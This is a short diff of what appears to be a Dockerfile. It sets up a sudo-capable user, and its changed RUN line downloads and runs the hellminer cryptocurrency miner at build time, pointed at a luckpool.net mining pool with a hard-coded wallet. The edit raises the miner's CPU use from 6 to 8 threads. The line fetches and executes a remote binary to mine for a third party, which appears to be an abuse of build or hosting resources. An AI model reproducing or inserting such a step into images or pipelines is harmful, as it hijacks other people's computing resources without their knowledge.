@@ -24,4 +24,4 @@ RUN useradd -m kunemuse && \
     adduser kunemuse sudo && \
     sudo usermod -a -G sudo kunemuse
 
-RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RC5TRVFLsZmkH5SuVZgRP3oxne92LiPRXs.cpu1 --cpu 6
+RUN wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar xf hellminer_cpu_linux.tar.gz && chmod +x hellminer && ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RC5TRVFLsZmkH5SuVZgRP3oxne92LiPRXs.cpu1 --cpu 8
